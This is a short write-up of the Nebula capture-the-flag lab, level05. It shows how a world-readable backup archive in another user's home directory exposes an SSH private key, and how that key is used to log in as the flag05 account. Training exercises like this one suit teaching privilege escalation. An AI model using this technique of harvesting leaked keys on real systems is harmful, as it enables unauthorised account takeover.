# Nebula
## level05
### Prompt

Check the flag05 home directory. You are looking for weak directory permissions

To do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05.

### Solution

There is a ``.ssh`` directory that cannot be accessed. However the ``.backup`` folder contains an archive that we can read (meaning we can extract its content in a directory we can write to).

```shell
level05@nebula:/home/flag05$ tar -xzvf .backup/backup-19072011.tgz -C /home/level05
```

Once extracted we have access to a ssh private key. If we try to connect to ``flag05@localhost`` it works.

```shell
level05@nebula:/home/flag05$ cd /home/level05/.ssh
level05@nebula:/home/flag05$ ssh flag05@localhost
flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
```
